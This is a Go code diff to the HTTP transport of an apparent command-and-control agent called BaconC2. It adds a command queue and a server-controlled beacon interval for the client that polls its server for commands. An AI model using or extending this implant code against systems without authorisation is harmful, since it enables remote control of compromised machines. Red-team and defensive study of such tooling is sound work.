@@ -9,6 +9,7 @@ import (
 	"time"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/models"
+	"github.com/RabbITCybErSeC/BaconC2/client/queue"
 )
 
 const (
@@ -18,16 +19,20 @@ const (
 )
 
 type HTTPTransport struct {
-	serverURL  string
-	agentID    string
-	httpClient *http.Client
+	serverURL      string
+	agentID        string
+	httpClient     *http.Client
+	commandQueue   queue.CommandQueue
+	beaconInterval time.Duration
 }
 
-func NewHTTPTransport(serverURL, agentID string) models.ITransportProtocol {
+func NewHTTPTransport(serverURL, agentID string, commandQueue queue.CommandQueue) models.ITransportProtocol {
 	return &HTTPTransport{
-		serverURL:  serverURL,
-		agentID:    agentID,
-		httpClient: &http.Client{Timeout: 10 * time.Second},
+		serverURL:      serverURL,
+		agentID:        agentID,
+		httpClient:     &http.Client{Timeout: 10 * time.Second},
+		commandQueue:   commandQueue,
+		beaconInterval: 10 * time.Second,
 	}
 }
 
@@ -71,16 +76,27 @@ func (t *HTTPTransport) Beacon() (models.Command, error) {
 	}
 
 	var response struct {
-		models.Command
-		Status string `json:"status,omitempty"`
+		Command    models.Command `json:"command"`
+		Status     string         `json:"status,omitempty"`
+		NextBeacon int            `json:"nextBeacon,omitempty"`
 	}
 	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
 		return emptyCmd, fmt.Errorf("failed to decode beacon response: %w", err)
 	}
 
+	// Update beacon interval if provided
+	if response.NextBeacon > 0 {
+		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
+	}
+
 	// If only "status" is returned (e.g., "acknowledged"), return an empty command
-	if response.ID == "" && response.Status == "acknowledged" {
+	if response.Command.ID == "" && response.Status == "acknowledged" {
 		return emptyCmd, nil
+	}
+
+	// Add command to queue
+	if err := t.commandQueue.Add(response.Command); err != nil {
+		return emptyCmd, fmt.Errorf("failed to queue command: %w", err)
 	}
 
 	return response.Command, nil
@@ -108,5 +124,10 @@ func (t *HTTPTransport) SendResult(agentID string, result models.Command) error 
 }
 
 func (t *HTTPTransport) Close() error {
-	return nil // No cleanup needed for HTTP
+	t.httpClient.CloseIdleConnections()
+	return nil
+}
+
+func (t *HTTPTransport) GetBeaconInterval() time.Duration {
+	return t.beaconInterval
 }
